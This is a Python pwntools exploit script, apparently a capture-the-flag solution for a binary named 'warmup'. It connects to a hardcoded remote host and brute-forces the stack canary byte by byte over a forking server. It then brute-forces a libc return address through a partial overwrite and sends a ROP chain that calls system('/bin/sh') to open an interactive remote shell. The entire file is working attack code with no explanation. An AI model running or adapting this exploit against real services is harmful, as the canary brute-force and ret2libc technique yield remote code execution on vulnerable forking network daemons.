#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./warmup"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    ip = "34.76.152.107"
    p = remote(ip, 17012)
elif len(argv) >= 2 and argv[1] == "d":
    cmd = """
        set follow-fork-mode child
        b *main+511
        #b *main+552
        c
    """
    ip = "127.0.0.1"
    p = gdb.debug(chall,cmd)
else:
    ip = "127.0.0.1"
    p = process(chall)


def brute_canary(port):
    canary = b'\x00'
    guess = 0
    padd = b'A' * 8 * 7

    while (len(canary) < 8):
        r = remote(ip, port)
        payload = padd
        payload += canary
        payload += p8(guess)
        r.send(payload)
        responce = r.recvall()
        r.close()
        if b"*** stack smashing detected ***" in responce:
            guess += 1
            continue
        else:
            canary += p8(guess)
            guess = 0
            continue

    canary = u64(canary)
    return canary

def brute_libc(port):
    leak = b'\x76'
    guess = 0
    padd = b'B' * 8 * 7

    while (len(leak) < 8):
        r = remote(ip, port)
        payload = padd
        payload += p64(canary)
        payload += p64(0xdeadbeefcafebabe)
        payload += leak
        payload += p8(guess)
        r.send(payload)
        responce = r.recvrepeat(timeout=3)
        if b"This is helper for you" in responce:
            r.close()
            leak += p8(guess)
            guess = 0
            continue
        else:
            r.close()
            guess += 1
            continue

    leak = u64(leak)
    return leak


p.recvuntil("at port ")
port = eval(p.recvline().rstrip())
log.info("Server Port: " + str(port))

p.recvuntil("it?")

# brute canary
canary = brute_canary(port)
log.info("canary: " + hex(canary))

# ret2main with partial overwrite
# and brute libc address
leak = brute_libc(port)
log.info("leak: " + hex(leak))
libc_base = leak - libc.symbols["__libc_start_call_main"] - 102
libc.address = libc_base
log.info("libc base: " + hex(libc_base))

rop_pop_rdi_ret = libc_base + 0x0019928a

payload = b'C' * 8 * 7
payload += p64(canary)
payload += p64(0xdeadbeefcafebabe)
payload += p64(rop_pop_rdi_ret + 1)# for movaps
payload += p64(rop_pop_rdi_ret)
payload += p64(next(libc.search(b"/bin/sh\0")))
payload += p64(libc.symbols["system"])

r = remote(ip, port)
r.send(payload)

r.interactive()
